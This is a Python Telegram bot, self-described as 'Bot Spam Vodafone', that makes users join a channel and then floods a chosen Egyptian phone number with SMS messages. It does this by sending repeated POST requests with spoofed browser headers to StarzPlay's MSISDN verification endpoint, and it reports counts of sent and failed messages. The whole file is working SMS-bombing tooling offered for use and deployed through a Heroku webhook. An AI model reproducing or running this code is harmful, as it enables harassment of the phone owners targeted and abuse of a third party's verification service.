import requests,user_agent,json,flask,telebot,random,os,sys
import telebot
from telebot import types
from user_agent import generate_user_agent
import logging
from config import *
from flask import Flask, request

bot = telebot.TeleBot(BOT_TOKEN)
server = Flask(__name__)
logger = telebot.logger
logger.setLevel(logging.DEBUG)
@bot.message_handler(commands=["start"])
def f(message):
	id = message.from_user.id
	name = message.chat.first_name
	t = "bo0tt"
	api = requests.get(f"https://ggrff7hnn.ml/vip1/Api(all)carlos.php?token={tok}&chaneel={t}&user_id={id}")
	if '"result":false' in api.text:
		p = types.InlineKeyboardButton(text="-قناه الاشتراك",url=f"https://t.me/{t}")
		maac = types.InlineKeyboardMarkup()
		maac.row_width = 4
		maac.add(p)
		bot.send_message(message.chat.id,text=f"""
🚸| عذرا عزيزي
🔰| عليك الاشتراك بقناة البوت لتتمكن من استخدامه

- @{t}

‼️| اشترك ثم ارسل /start
""",parse_mode='html',reply_to_message_id=message.message_id, reply_markup=maac)
	if '"result":true' in api.text:
		id = message.from_user.id
		name = message.chat.first_name
		u = "https://t.me/pydroi_d_3/37"
		bot.send_photo(message.chat.id,u,f"""
- - - - - - - - - - - - - - - - - 
- Welcome Bot Spam Vodafone 
- Your Name : {name}
- Your ID : {id}
- Send Phone Number|numer spam 
- ex:
	01026481548364-100
- Dev -@uufffuu""")
@bot.message_handler(func=lambda m:True)
def f(message):
	number = message.text.split("-")[0]
	spam = message.text.split("-")[1]
	er = int(spam)
	g=0
	m=0
	chat_id = str(message.chat.id)
	start = bot.send_message(message.chat.id, f'Whit...')
	for i in range(er):
		url = 'https://arabia.starzplay.com/api/esb/userAccount/MSISDN/verify'
		headers = {
	"Host": "arabia.starzplay.com",
    "content-length": "86",
    "sec-ch-ua": "\" Not A;Brand\";v\u003d\"99\", \"Chromium\";v\u003d\"90\", \"Google Chrome\";v\u003d\"90\"",
    "accept": "application/json, text/javascript, */*; q\u003d0.01",
    "x-requested-with": "XMLHttpRequest",
    "sec-ch-ua-mobile": "?1",
    "user-agent": "Mozilla/5.0 (Linux; Android 8.1.0; DUB-LX1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.210 Mobile Safari/537.36",
    "content-type": "application/x-www-form-urlencoded; charset\u003dUTF-8",
    "origin": "https://arabia.starzplay.com",
    "sec-fetch-site": "same-origin",
    "sec-fetch-mode": "cors",
    "sec-fetch-dest": "empty",
    "referer": "https://arabia.starzplay.com/ar/partners/vodafone-egypt",
    "accept-encoding": "gzip, deflate, br",
    "accept-language": "en-US,en;q\u003d0.9,ar-EG;q\u003d0.8,ar;q\u003d0.7",
    "cookie": "_gat_UA-52364929-4\u003d1"
	}
		data = {
	'mobilePrefix' : '20' ,
    'mobileNumber' :number,
    'operator' : 'vodafoneegypt' 
	}
		re = requests.post(url,headers=headers,data=data).text
		if ("smsTransactionId") in re:
			g+=1
			result = f"""
- - - - - - - - - - - - - - - -
- Done : {g}
-
- Bad : {m}
-
- Number : {number}
- - - - - - - - - - - - - - - -"""
			bot.edit_message_text(text=result,chat_id=int(chat_id), message_id=start.message_id)
		else:
			m+=1
			result = f"""
- - - - - - - - - - - - - - - -
- Done : {g}
-
- Bad : {m}
-
- Number : {number}
- - - - - - - - - - - - - - - -"""
			bot.edit_message_text(text=result,chat_id=int(chat_id), message_id=start.message_id)
@server.route(f"/{BOT_TOKEN}", methods=["POST"])
def redirect_message():
    json_string = request.get_data().decode("utf-8")
    update = telebot.types.Update.de_json(json_string)
    bot.process_new_updates([update])
    return "!", 200

if __name__ == "__main__":
    bot.remove_webhook()
    bot.set_webhook(url="https://spambotpy.herokuapp.com/"+str(BOT_TOKEN))
    server.run(host="0.0.0.0", port=int(os.environ.get("PORT", 5000)))